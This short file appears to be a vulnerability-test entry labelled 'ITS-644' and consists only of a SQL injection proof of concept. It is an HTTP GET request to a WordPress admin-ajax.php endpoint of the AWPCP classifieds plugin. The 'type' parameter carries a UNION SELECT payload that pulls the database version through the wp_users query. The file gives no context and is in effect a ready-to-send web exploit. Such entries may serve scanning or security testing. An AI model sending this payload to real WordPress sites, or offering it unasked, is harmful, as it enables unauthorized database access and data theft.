# Vulnerable: ITS-644
GET /wp-admin/admin-ajax.php?action=awpcp-get-regions-options&context=search&parent_type=country&parent=test&type=id'+FROM+wp_users+WHERE+1=0+UNION+SELECT+VERSION();--+-
